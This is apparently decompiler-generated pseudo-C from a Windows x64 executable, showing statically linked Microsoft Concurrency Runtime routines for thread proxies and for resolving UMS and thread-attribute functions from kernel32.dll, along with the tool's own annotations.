// 13F18B020: using guessed type void *Concurrency::details::ExecutionResource::`vftable';

//----- (000000013F152E3C) ----------------------------------------------------
__int64 __fastcall sub_13F152E3C(__int64 a1, char a2)
{
  return sub_13F146D80(*(_QWORD *)(a1 + 24), a1, a2);
}

//----- (000000013F152E4C) ----------------------------------------------------
char *__fastcall sub_13F152E4C(__int64 a1, __int64 a2, char a3)
{
  __int64 v6; // rbx
  __int64 v7; // rsi
  unsigned __int128 v8; // rax
  char *v9; // rdi
  __int64 v10; // rax
  __int64 v11; // rcx
  __int64 v12; // rdx
  __int64 *v13; // rcx
  __int64 v14; // rax
  __int64 v15; // rdx
  char *result; // rax
  char v17[64]; // [rsp+30h] [rbp-78h] BYREF

  v6 = a1 + 64;
  sub_13F1419D8(a1 + 64);
  v7 = 0i64;
  if ( *(int *)(a2 + 16) <= 8 )
  {
    v9 = v17;
  }
  else
  {
    v8 = (unsigned __int64)*(int *)(a2 + 16) * (unsigned __int128)8ui64;
    if ( !is_mul_ok(*(int *)(a2 + 16), 8ui64) )
      *(_QWORD *)&v8 = -1i64;
    v9 = (char *)sub_13F1790C4(v8, *((_QWORD *)&v8 + 1));
  }
  v10 = *(_QWORD *)(a2 + 24);
  if ( v10 )
    v10 = *(_QWORD *)(v10 + 88);
  if ( v10 )
  {
    do
    {
      if ( v10 == *(_QWORD *)(a2 + 24) )
        v11 = 0i64;
      else
        v11 = *(_QWORD *)(v10 + 88);
      v12 = *(_QWORD *)(v10 + 48);
      if ( v12 && !*(_BYTE *)(v12 + 112) )
      {
        *(_QWORD *)&v9[8 * v7] = v12;
        v7 = (unsigned int)(v7 + 1);
      }
      v10 = v11;
    }
    while ( v11 );
  }
  v13 = *(__int64 **)(a1 + 16);
  v14 = *v13;
  if ( a3 )
    (*(void (__fastcall **)(__int64 *, char *, _QWORD))(v14 + 48))(v13, v9, (unsigned int)v7);
  else
    (*(void (__fastcall **)(__int64 *, char *, _QWORD))(v14 + 40))(v13, v9, (unsigned int)v7);
  sub_13F141BDC(v6);
  result = v17;
  if ( v9 != v17 )
    return (char *)sub_13F14088C(v9, v15);
  return result;
}
// 13F152F35: variable 'v15' is possibly undefined
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F1419D8: using guessed type __int64 __fastcall sub_13F1419D8(_QWORD);
// 13F141BDC: using guessed type __int64 __fastcall sub_13F141BDC(_QWORD);
// 13F1790C4: using guessed type __int64 __fastcall sub_13F1790C4(_QWORD, _QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F152F60) ----------------------------------------------------
__int64 __fastcall sub_13F152F60(__int64 a1)
{
  return sub_13F147780(*(_QWORD *)(a1 + 24), a1);
}

//----- (000000013F152F78) ----------------------------------------------------
__int64 __fastcall sub_13F152F78(__int64 a1, __int64 a2, unsigned int a3)
{
  __int64 v3; // r10
  __int64 v4; // rax
  char v5; // r8
  __int64 v6; // r9
  int v7; // eax
  __int64 result; // rax

  v3 = *(_QWORD *)(a2 + 56);
  v4 = a3;
  v5 = 0;
  v6 = 9 * v4;
  v7 = *(_DWORD *)(a1 + 216);
  if ( *(_BYTE *)(v3 + 8 * v6 + 65) )
  {
    result = (unsigned int)(v7 - 1);
    *(_DWORD *)(a1 + 216) = result;
    --*(_DWORD *)(a2 + 40);
  }
  else
  {
    result = (unsigned int)(v7 + 1);
    v5 = 1;
    *(_DWORD *)(a1 + 216) = result;
    ++*(_DWORD *)(a2 + 40);
  }
  *(_BYTE *)(v3 + 8 * v6 + 65) = v5;
  return result;
}

//----- (000000013F152FB8) ----------------------------------------------------
__int64 __fastcall sub_13F152FB8(__int64 a1, __int64 a2)
{
  __int64 v2; // rax
  __int64 pExceptionObject[5]; // [rsp+20h] [rbp-28h] BYREF

  if ( !a2 )
  {
    sub_13F1097A8(pExceptionObject, (__int64)"pContext");
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI3_AVinvalid_argument_std__);
  }
  v2 = (*(__int64 (__fastcall **)(__int64))(*(_QWORD *)a2 + 16i64))(a2);
  return sub_13F15BADC(v2);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F152FB8: using guessed type _QWORD pExceptionObject[5];

//----- (000000013F153000) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
__int64 sub_13F153000()
{
  __int64 v0; // rax
  __int64 v1; // rax
  __int64 v2; // rax
  __int64 v3; // rax
  __int64 v4; // rax
  __int64 v5; // rax
  __int64 v6; // rax
  __int64 v7; // rax
  __int64 v8; // rax
  __int64 v9; // rax
  __int64 v10; // rax
  __int64 v11; // rax
  __int64 v12; // rax
  __int64 v13; // rax
  __int64 v14; // rax
  __int64 v15; // rax
  __int64 v16; // rax
  __int64 v17; // rax
  __int64 v18; // rax
  __int64 v19; // rax
  __int64 v20; // rax
  __int64 v21; // rax
  __int64 v22; // rax
  __int64 v23; // rax
  __int64 v24; // rax
  __int64 v25; // rax
  __int64 v26; // rax
  __int64 v27; // rax
  __int64 v28; // rax
  __int64 v29; // rax
  __int64 v30; // rax
  __int64 v31; // rax
  __int64 v32; // rax
  __int64 v33; // rax
  int v35; // eax
  int v36; // edx
  int v37; // eax
  int v38; // edx
  int v39; // eax
  int v40; // edx
  int v41; // eax
  int v42; // edx
  int v43; // eax
  int v44; // edx
  int v45; // eax
  int v46; // edx
  int v47; // eax
  int v48; // edx
  int v49; // eax
  int v50; // edx
  int v51; // eax
  int v52; // edx
  int v53; // eax
  int v54; // edx
  int v55; // eax
  int v56; // edx
  int v57; // eax
  int v58; // edx
  int v59; // eax
  int v60; // edx
  int v61; // eax
  int v62; // edx
  int v63; // eax
  int v64; // edx
  int v65; // eax
  int v66; // edx
  int v67; // eax
  int v68; // edx
  char pExceptionObject[32]; // [rsp+20h] [rbp-E0h] BYREF
  char v70[32]; // [rsp+40h] [rbp-C0h] BYREF
  char v71[32]; // [rsp+60h] [rbp-A0h] BYREF
  char v72[32]; // [rsp+80h] [rbp-80h] BYREF
  char v73[32]; // [rsp+A0h] [rbp-60h] BYREF
  char v74[32]; // [rsp+C0h] [rbp-40h] BYREF
  char v75[32]; // [rsp+E0h] [rbp-20h] BYREF
  char v76[32]; // [rsp+100h] [rbp+0h] BYREF
  char v77[32]; // [rsp+120h] [rbp+20h] BYREF
  char v78[32]; // [rsp+140h] [rbp+40h] BYREF
  char v79[32]; // [rsp+160h] [rbp+60h] BYREF
  char v80[32]; // [rsp+180h] [rbp+80h] BYREF
  char v81[32]; // [rsp+1A0h] [rbp+A0h] BYREF
  char v82[32]; // [rsp+1C0h] [rbp+C0h] BYREF
  char v83[32]; // [rsp+1E0h] [rbp+E0h] BYREF
  char v84[32]; // [rsp+200h] [rbp+100h] BYREF
  char v85[32]; // [rsp+220h] [rbp+120h] BYREF

  v0 = MEMORY[0x76F920C0](L"kernel32.dll");
  v1 = MEMORY[0x76F92020](v0, "CreateRemoteThreadEx");
  if ( !v1 )
  {
    v35 = MEMORY[0x76F91760]();
    v36 = (unsigned __int16)v35 | 0x80070000;
    if ( v35 <= 0 )
      v36 = v35;
    sub_13F142E40((__int64)pExceptionObject, v36);
    CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  qword_13F1C5E68 = sub_13F142890(v1);
  v2 = MEMORY[0x76F920C0](L"kernel32.dll");
  v3 = MEMORY[0x76F92020](v2, "CreateUmsCompletionList");
  if ( !v3 )
  {
    v37 = MEMORY[0x76F91760]();
    v38 = (unsigned __int16)v37 | 0x80070000;
    if ( v37 <= 0 )
      v38 = v37;
    sub_13F142E40((__int64)v70, v38);
    CxxThrowException(v70, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  qword_13F1C5E00 = sub_13F142890(v3);
  v4 = MEMORY[0x76F920C0](L"kernel32.dll");
  v5 = MEMORY[0x76F92020](v4, "CreateUmsThreadContext");
  if ( !v5 )
  {
    v39 = MEMORY[0x76F91760]();
    v40 = (unsigned __int16)v39 | 0x80070000;
    if ( v39 <= 0 )
      v40 = v39;
    sub_13F142E40((__int64)v71, v40);
    CxxThrowException(v71, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  qword_13F1C5E58 = sub_13F142890(v5);
  v6 = MEMORY[0x76F920C0](L"kernel32.dll");
  v7 = MEMORY[0x76F92020](v6, "DeleteProcThreadAttributeList");
  if ( !v7 )
  {
    v41 = MEMORY[0x76F91760]();
    v42 = (unsigned __int16)v41 | 0x80070000;
    if ( v41 <= 0 )
      v42 = v41;
    sub_13F142E40((__int64)v72, v42);
    CxxThrowException(v72, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  qword_13F1C5E80 = sub_13F142890(v7);
  v8 = MEMORY[0x76F920C0](L"kernel32.dll");
  v9 = MEMORY[0x76F92020](v8, "DeleteUmsCompletionList");
  if ( !v9 )
  {
    v43 = MEMORY[0x76F91760]();
    v44 = (unsigned __int16)v43 | 0x80070000;
    if ( v43 <= 0 )
      v44 = v43;
    sub_13F142E40((__int64)v73, v44);
    CxxThrowException(v73, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  qword_13F1C5E28 = sub_13F142890(v9);
  v10 = MEMORY[0x76F920C0](L"kernel32.dll");
  v11 = MEMORY[0x76F92020](v10, "DeleteUmsThreadContext");
  if ( !v11 )
  {
    v45 = MEMORY[0x76F91760]();
    v46 = (unsigned __int16)v45 | 0x80070000;
    if ( v45 <= 0 )
      v46 = v45;
    sub_13F142E40((__int64)v74, v46);
    CxxThrowException(v74, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  qword_13F1C5E50 = sub_13F142890(v11);
  v12 = MEMORY[0x76F920C0](L"kernel32.dll");
  v13 = MEMORY[0x76F92020](v12, "DequeueUmsCompletionListItems");
  if ( !v13 )
  {
    v47 = MEMORY[0x76F91760]();
    v48 = (unsigned __int16)v47 | 0x80070000;
    if ( v47 <= 0 )
      v48 = v47;
    sub_13F142E40((__int64)v75, v48);
    CxxThrowException(v75, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  qword_13F1C5E08 = sub_13F142890(v13);
  v14 = MEMORY[0x76F920C0](L"kernel32.dll");
  v15 = MEMORY[0x76F92020](v14, "EnterUmsSchedulingMode");
  if ( !v15 )
  {
    v49 = MEMORY[0x76F91760]();
    v50 = (unsigned __int16)v49 | 0x80070000;
    if ( v49 <= 0 )
      v50 = v49;
    sub_13F142E40((__int64)v76, v50);
    CxxThrowException(v76, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  qword_13F1C5E60 = sub_13F142890(v15);
  v16 = MEMORY[0x76F920C0](L"kernel32.dll");
  v17 = MEMORY[0x76F92020](v16, "ExecuteUmsThread");
  if ( !v17 )
  {
    v51 = MEMORY[0x76F91760]();
    v52 = (unsigned __int16)v51 | 0x80070000;
    if ( v51 <= 0 )
      v52 = v51;
    sub_13F142E40((__int64)v77, v52);
    CxxThrowException(v77, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  qword_13F1C5E18 = sub_13F142890(v17);
  v18 = MEMORY[0x76F920C0](L"kernel32.dll");
  v19 = MEMORY[0x76F92020](v18, "GetCurrentUmsThread");
  if ( !v19 )
  {
    v53 = MEMORY[0x76F91760]();
    v54 = (unsigned __int16)v53 | 0x80070000;
    if ( v53 <= 0 )
      v54 = v53;
    sub_13F142E40((__int64)v78, v54);
    CxxThrowException(v78, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  qword_13F1C5E30 = sub_13F142890(v19);
  v20 = MEMORY[0x76F920C0](L"kernel32.dll");
  v21 = MEMORY[0x76F92020](v20, "GetNextUmsListItem");
  if ( !v21 )
  {
    v55 = MEMORY[0x76F91760]();
    v56 = (unsigned __int16)v55 | 0x80070000;
    if ( v55 <= 0 )
      v56 = v55;
    sub_13F142E40((__int64)v79, v56);
    CxxThrowException(v79, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  qword_13F1C5E38 = sub_13F142890(v21);
  v22 = MEMORY[0x76F920C0](L"kernel32.dll");
  v23 = MEMORY[0x76F92020](v22, "GetUmsCompletionListEvent");
  if ( !v23 )
  {
    v57 = MEMORY[0x76F91760]();
    v58 = (unsigned __int16)v57 | 0x80070000;
    if ( v57 <= 0 )
      v58 = v57;
    sub_13F142E40((__int64)v80, v58);
    CxxThrowException(v80, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  qword_13F1C5E10 = sub_13F142890(v23);
  v24 = MEMORY[0x76F920C0](L"kernel32.dll");
  v25 = MEMORY[0x76F92020](v24, "InitializeProcThreadAttributeList");
  if ( !v25 )
  {
    v59 = MEMORY[0x76F91760]();
    v60 = (unsigned __int16)v59 | 0x80070000;
    if ( v59 <= 0 )
      v60 = v59;
    sub_13F142E40((__int64)v81, v60);
    CxxThrowException(v81, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  qword_13F1C5E70 = sub_13F142890(v25);
  v26 = MEMORY[0x76F920C0](L"kernel32.dll");
  v27 = MEMORY[0x76F92020](v26, "QueryUmsThreadInformation");
  if ( !v27 )
  {
    v61 = MEMORY[0x76F91760]();
    v62 = (unsigned __int16)v61 | 0x80070000;
    if ( v61 <= 0 )
      v62 = v61;
    sub_13F142E40((__int64)v82, v62);
    CxxThrowException(v82, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  qword_13F1C5E40 = sub_13F142890(v27);
  v28 = MEMORY[0x76F920C0](L"kernel32.dll");
  v29 = MEMORY[0x76F92020](v28, "SetUmsThreadInformation");
  if ( !v29 )
  {
    v63 = MEMORY[0x76F91760]();
    v64 = (unsigned __int16)v63 | 0x80070000;
    if ( v63 <= 0 )
      v64 = v63;
    sub_13F142E40((__int64)v83, v64);
    CxxThrowException(v83, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  qword_13F1C5E48 = sub_13F142890(v29);
  v30 = MEMORY[0x76F920C0](L"kernel32.dll");
  v31 = MEMORY[0x76F92020](v30, "UmsThreadYield");
  if ( !v31 )
  {
    v65 = MEMORY[0x76F91760]();
    v66 = (unsigned __int16)v65 | 0x80070000;
    if ( v65 <= 0 )
      v66 = v65;
    sub_13F142E40((__int64)v84, v66);
    CxxThrowException(v84, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  qword_13F1C5E20 = sub_13F142890(v31);
  v32 = MEMORY[0x76F920C0](L"kernel32.dll");
  v33 = MEMORY[0x76F92020](v32, "UpdateProcThreadAttribute");
  if ( !v33 )
  {
    v67 = MEMORY[0x76F91760]();
    v68 = (unsigned __int16)v67 | 0x80070000;
    if ( v67 <= 0 )
      v68 = v67;
    sub_13F142E40((__int64)v85, v68);
    CxxThrowException(v85, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
  }
  qword_13F1C5E78 = sub_13F142890(v33);
  return (unsigned int)_InterlockedExchange(&dword_13F1C5E88, 1);
}
// 13F153049: write access to const memory at 13F1C5E68 has been detected
// 13F15307A: write access to const memory at 13F1C5E00 has been detected
// 13F1530AB: write access to const memory at 13F1C5E58 has been detected
// 13F1530DC: write access to const memory at 13F1C5E80 has been detected
// 13F15310D: write access to const memory at 13F1C5E28 has been detected
// 13F15313E: write access to const memory at 13F1C5E50 has been detected
// 13F15316F: write access to const memory at 13F1C5E08 has been detected
// 13F1531A0: write access to const memory at 13F1C5E60 has been detected
// 13F1531D1: write access to const memory at 13F1C5E18 has been detected
// 13F153202: write access to const memory at 13F1C5E30 has been detected
// 13F153233: write access to const memory at 13F1C5E38 has been detected
// 13F153264: write access to const memory at 13F1C5E10 has been detected
// 13F153295: write access to const memory at 13F1C5E70 has been detected
// 13F1532C6: write access to const memory at 13F1C5E40 has been detected
// 13F1532F7: write access to const memory at 13F1C5E48 has been detected
// 13F153328: write access to const memory at 13F1C5E20 has been detected
// 13F15335E: write access to const memory at 13F1C5E78 has been detected
// 13F181660: using guessed type wchar_t aKernel32Dll[13];
// 13F1C5E00: using guessed type __int64 qword_13F1C5E00;
// 13F1C5E08: using guessed type __int64 qword_13F1C5E08;
// 13F1C5E10: using guessed type __int64 qword_13F1C5E10;
// 13F1C5E18: using guessed type __int64 qword_13F1C5E18;
// 13F1C5E20: using guessed type __int64 qword_13F1C5E20;
// 13F1C5E28: using guessed type __int64 qword_13F1C5E28;
// 13F1C5E30: using guessed type __int64 qword_13F1C5E30;
// 13F1C5E38: using guessed type __int64 qword_13F1C5E38;
// 13F1C5E40: using guessed type __int64 qword_13F1C5E40;
// 13F1C5E48: using guessed type __int64 qword_13F1C5E48;
// 13F1C5E50: using guessed type __int64 qword_13F1C5E50;
// 13F1C5E58: using guessed type __int64 qword_13F1C5E58;
// 13F1C5E60: using guessed type __int64 qword_13F1C5E60;
// 13F1C5E68: using guessed type __int64 qword_13F1C5E68;
// 13F1C5E70: using guessed type __int64 qword_13F1C5E70;
// 13F1C5E78: using guessed type __int64 qword_13F1C5E78;
// 13F1C5E80: using guessed type __int64 qword_13F1C5E80;
// 13F1C5E88: using guessed type int dword_13F1C5E88;

//----- (000000013F1536B4) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
void sub_13F1536B4()
{
  int v0; // eax
  int v1; // edx
  char pExceptionObject[32]; // [rsp+20h] [rbp-68h] BYREF

  qword_13F1C5EA0 = MEMORY[0x76F85AE0](L"combase.dll", 0i64, 2048i64);
  v0 = MEMORY[0x76F91760]();
  v1 = (unsigned __int16)v0 | 0x80070000;
  if ( v0 <= 0 )
    v1 = v0;
  sub_13F142E40((__int64)pExceptionObject, v1);
  CxxThrowException(pExceptionObject, (_ThrowInfo *)&_TI2_AVscheduler_resource_allocation_error_Concurrency__);
}
// 13F1536D0: write access to const memory at 13F1C5EA0 has been detected
// 13F153711: write access to const memory at 13F1C5E90 has been detected
// 13F15373F: write access to const memory at 13F1C5E98 has been detected
// 13F18B490: using guessed type wchar_t aCombaseDll[12];
// 13F1C5E90: using guessed type __int64 qword_13F1C5E90;
// 13F1C5E98: using guessed type __int64 qword_13F1C5E98;
// 13F1C5EA0: using guessed type __int64 qword_13F1C5EA0;

//----- (000000013F1537EC) ----------------------------------------------------
__int64 __fastcall sub_13F1537EC(unsigned int a1)
{
  __int64 (__fastcall *v2)(_QWORD); // rax

  v2 = (__int64 (__fastcall *)(_QWORD))sub_13F142890(0i64);
  return v2(a1);
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5E90: using guessed type __int64 qword_13F1C5E90;

//----- (000000013F153810) ----------------------------------------------------
__int64 sub_13F153810()
{
  __int64 (*v0)(void); // rax

  v0 = (__int64 (*)(void))sub_13F142890(0i64);
  return v0();
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F1C5E98: using guessed type __int64 qword_13F1C5E98;

//----- (000000013F15382C) ----------------------------------------------------
__int64 __fastcall sub_13F15382C(__int64 a1)
{
  *(_QWORD *)a1 = 0i64;
  *(_QWORD *)(a1 + 8) = 0i64;
  sub_13F1416E8(a1 + 24);
  *(_DWORD *)(a1 + 16) = sub_13F1427CC();
  return a1;
}

//----- (000000013F153868) ----------------------------------------------------
__int64 __fastcall sub_13F153868(__int64 *a1)
{
  __int64 v2; // rcx
  __int64 v3; // rcx

  v2 = *a1;
  if ( v2 )
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v2 + 48i64))(v2);
  v3 = a1[1];
  if ( v3 )
    (*(void (__fastcall **)(__int64))(*(_QWORD *)v3 + 48i64))(v3);
  sub_13F142810(*((unsigned int *)a1 + 4));
  return sub_13F1417C0(a1 + 3);
}
// 13F1417C0: using guessed type __int64 __fastcall sub_13F1417C0(_QWORD);
// 13F142810: using guessed type __int64 __fastcall sub_13F142810(_QWORD);
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F1538C0) ----------------------------------------------------
_QWORD *__fastcall sub_13F1538C0(_QWORD *a1, char a2)
{
  *a1 = off_13F18B5A8;
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 80i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18B5A8: using guessed type void (__fastcall __noreturn *off_13F18B5A8[6])();

//----- (000000013F1538EC) ----------------------------------------------------
_QWORD *__fastcall sub_13F1538EC(_QWORD *a1, char a2)
{
  *a1 = &Concurrency::details::FreeThreadProxy::`vftable';
  sub_13F15BD70((__int64)a1);
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 128i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18B570: using guessed type void *Concurrency::details::FreeThreadProxy::`vftable';

//----- (000000013F15392C) ----------------------------------------------------
_QWORD *__fastcall sub_13F15392C(_QWORD *a1, char a2)
{
  *a1 = off_13F18B5A8;
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 96i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18B5A8: using guessed type void (__fastcall __noreturn *off_13F18B5A8[6])();

//----- (000000013F153958) ----------------------------------------------------
_QWORD *__fastcall sub_13F153958(_QWORD *a1, char a2)
{
  *a1 = off_13F18B5A8;
  if ( (a2 & 1) != 0 )
    sub_13F14088C(a1, 8i64);
  return a1;
}
// 13F14088C: using guessed type __int64 __fastcall sub_13F14088C(_QWORD, _QWORD);
// 13F18B5A8: using guessed type void (__fastcall __noreturn *off_13F18B5A8[6])();

//----- (000000013F153984) ----------------------------------------------------
_QWORD *__fastcall sub_13F153984(__int64 a1, int a2)
{
  __int64 v4; // rax
  _QWORD *v5; // rbx

  v4 = sub_13F14059C(128i64);
  v5 = (_QWORD *)v4;
  if ( !v4 )
    return 0i64;
  sub_13F15BC34(v4, a1, a2);
  *v5 = &Concurrency::details::FreeThreadProxy::`vftable';
  v5[10] = 0i64;
  *((_WORD *)v5 + 40) = 0;
  v5[9] = 0i64;
  return v5;
}
// 13F18B570: using guessed type void *Concurrency::details::FreeThreadProxy::`vftable';

//----- (000000013F153A04) ----------------------------------------------------
// write access to const memory has been detected, the output may be wrong!
_QWORD *__fastcall sub_13F153A04(__int64 a1, __int64 a2)
{
  _QWORD *v3; // rax
  _QWORD *v4; // rbx
  __int64 v5; // rsi
  int v6; // eax
  _QWORD *v7; // rdi

  dword_13F1C5EAC = 4 * sub_13F1454C8(a1, a2);
  v3 = (_QWORD *)sub_13F14059C(96i64);
  v4 = v3;
  if ( !v3 )
    return 0i64;
  v5 = 4i64;
  *v3 = &Concurrency::details::ThreadProxyFactory<Concurrency::details::FreeThreadProxy>::`vftable';
  v6 = *(_DWORD *)(a1 + 16);
  v7 = v4 + 2;
  *((_DWORD *)v4 + 2) = v6;
  do
  {
    MEMORY[0x77202BF0](v7);
    v7 += 2;
    --v5;
  }
  while ( v5 );
  *v4 = &byte_13F18B648;
  *((_DWORD *)v4 + 20) = 1;
  *((_BYTE *)v4 + 84) = 0;
  return v4;
}
// 13F153A27: write access to const memory at 13F1C5EAC has been detected
// 13F1454C8: using guessed type __int64 __fastcall sub_13F1454C8(_QWORD, _QWORD);
// 13F18B5F0: using guessed type void *Concurrency::details::ThreadProxyFactory<Concurrency::details::FreeThreadProxy>::`vftable';
// 13F18B648: using guessed type char byte_13F18B648;
// 13F1C5EAC: using guessed type int dword_13F1C5EAC;

//----- (000000013F153A9C) ----------------------------------------------------
__int64 __fastcall sub_13F153A9C(__int64 a1)
{
  return *(unsigned int *)(a1 + 8);
}

//----- (000000013F153AA0) ----------------------------------------------------
__int64 __fastcall sub_13F153AA0(__int64 a1)
{
  __int64 v2; // rbx
  __int64 v3; // rdx

  if ( !*(_QWORD *)a1 )
  {
    v2 = a1 + 24;
    sub_13F1419D8(a1 + 24);
    if ( !*(_QWORD *)a1 )
      *(_QWORD *)a1 = sub_13F153A04(a1, v3);
    sub_13F141BDC(v2);
  }
  return *(_QWORD *)a1;
}
// 13F153AD8: variable 'v3' is possibly undefined
// 13F1419D8: using guessed type __int64 __fastcall sub_13F1419D8(_QWORD);
// 13F141BDC: using guessed type __int64 __fastcall sub_13F141BDC(_QWORD);

//----- (000000013F153AF8) ----------------------------------------------------
__int64 __fastcall sub_13F153AF8(__int64 a1, __int64 a2, int a3)
{
  __int64 result; // rax

  result = a2;
  if ( *(_DWORD *)(a2 + 44) != a3 )
    return sub_13F15BE14(a2, a3);
  return result;
}

//----- (000000013F153B18) ----------------------------------------------------
__int64 __fastcall sub_13F153B18(__int64 a1, __int64 a2)
{
  __int64 result; // rax
  int v5; // edx

  result = (__int64)qword_13F18B5D8;
  v5 = 0;
  while ( *(_DWORD *)(a2 + 40) != *(_DWORD *)result )
  {
    ++v5;
    result += 4i64;
    if ( result >= (__int64)&off_13F18B5E8 )
      goto LABEL_6;
  }
  result = (unsigned __int16)MEMORY[0x771A31E0](a1 + 16 * (v5 + 1i64));
LABEL_6:
  if ( a2 )
    return (*(__int64 (__fastcall **)(__int64, __int64))(*(_QWORD *)a1 + 64i64))(a1, a2);
  return result;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F18B5D8: using guessed type __int64 qword_13F18B5D8[2];
// 13F18B5E8: using guessed type int *off_13F18B5E8;

//----- (000000013F153BAC) ----------------------------------------------------
char __fastcall sub_13F153BAC(_BYTE *a1, __int64 a2)
{
  __int64 *v2; // rax
  int v5; // edx
  int v6; // ecx

  LOBYTE(v2) = a1[84];
  if ( !(_BYTE)v2 )
  {
    v5 = *(_DWORD *)(a2 + 40);
    v2 = qword_13F18B5D8;
    v6 = 0;
    while ( v5 != *(_DWORD *)v2 )
    {
      ++v6;
      v2 = (__int64 *)((char *)v2 + 4);
      if ( (__int64)v2 >= (__int64)&off_13F18B5E8 )
        goto LABEL_7;
    }
    LOBYTE(v2) = MEMORY[0x771A31E0](&a1[16 * v6 + 16]);
  }
LABEL_7:
  if ( a2 )
    LOBYTE(v2) = (*(__int64 (__fastcall **)(_BYTE *, __int64))(*(_QWORD *)a1 + 64i64))(a1, a2);
  return (char)v2;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F18B5D8: using guessed type __int64 qword_13F18B5D8[2];
// 13F18B5E8: using guessed type int *off_13F18B5E8;

//----- (000000013F153C8C) ----------------------------------------------------
__int64 __fastcall sub_13F153C8C(__int64 a1)
{
  return (unsigned int)_InterlockedIncrement((volatile signed __int32 *)(a1 + 80));
}

//----- (000000013F153C9C) ----------------------------------------------------
__int64 __fastcall sub_13F153C9C(volatile signed __int32 *a1)
{
  unsigned __int32 v1; // ebx

  v1 = _InterlockedDecrement(a1 + 20);
  if ( !v1 && a1 )
    (*(void (__fastcall **)(volatile signed __int32 *, __int64))(*(_QWORD *)a1 + 40i64))(a1, 1i64);
  return v1;
}
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);

//----- (000000013F153CCC) ----------------------------------------------------
__int64 __fastcall sub_13F153CCC(__int64 a1, unsigned int a2, unsigned int a3)
{
  __int64 *v3; // rbp
  int v4; // esi
  __int64 v8; // rax
  __int64 v9; // rbx

  v3 = qword_13F18B5D8;
  v4 = 0;
  while ( 1 )
  {
    if ( a2 <= *(_DWORD *)v3 )
    {
      v8 = MEMORY[0x771DAED0](a1 + 16 * (v4 + 1i64));
      v9 = (v8 - 96) & -(__int64)(v8 != 0);
      if ( v9 )
        break;
    }
    ++v4;
    v3 = (__int64 *)((char *)v3 + 4);
    if ( v4 >= 4 )
    {
      v9 = (*(__int64 (__fastcall **)(__int64, _QWORD))(*(_QWORD *)a1 + 56i64))(a1, a2);
      if ( !v9 )
        return v9;
      break;
    }
  }
  (*(void (__fastcall **)(__int64, __int64, _QWORD))(*(_QWORD *)a1 + 72i64))(a1, v9, a3);
  return v9;
}
// 13F153D2E: conditional instruction was optimized away because rbx.8==0
// 13F180458: using guessed type __int64 (__fastcall *_guard_dispatch_icall_fptr)(_QWORD);
// 13F18B5D8: using guessed type __int64 qword_13F18B5D8[2];

//----- (000000013F153D80) ----------------------------------------------------
void __fastcall sub_13F153D80(__int64 a1, __int64 a2)
{
  sub_13F15BDF0(a2);
}

//----- (000000013F153D88) ----------------------------------------------------
__int64 __fastcall sub_13F153D88(__int64 a1)
{
  __int64 v2; // rdi
  __int64 v3; // rsi
  __int64 v4; // rax
  __int64 v5; // r8
  __int128 v6; // rax
  __int64 v7; // rbx

  v2 = a1 + 16;
  v3 = 4i64;
  do
  {
    v4 = MEMORY[0x771B51E0](v2);
    v5 = v4 - 96;
    v6 = -(__int128)(unsigned __int64)v4;
    for ( *((_QWORD *)&v6 + 1) &= v5; *((_QWORD *)&v6 + 1); *((_QWORD *)&v6 + 1) = (v7 - 96) & -(__int64)(v7 != 0) )
    {
      v7 = *(_QWORD *)(*((_QWORD *)&v6 + 1) + 96i64);
      (*(void (__fastcall **)(__int64))(*(_QWORD *)a1 + 64i64))(a1);
      *(_QWORD *)&v6 = v7 - 96;
    }
    v2 += 16i64;
    --v3;
  }
  while ( v3 );
  return v6;
}
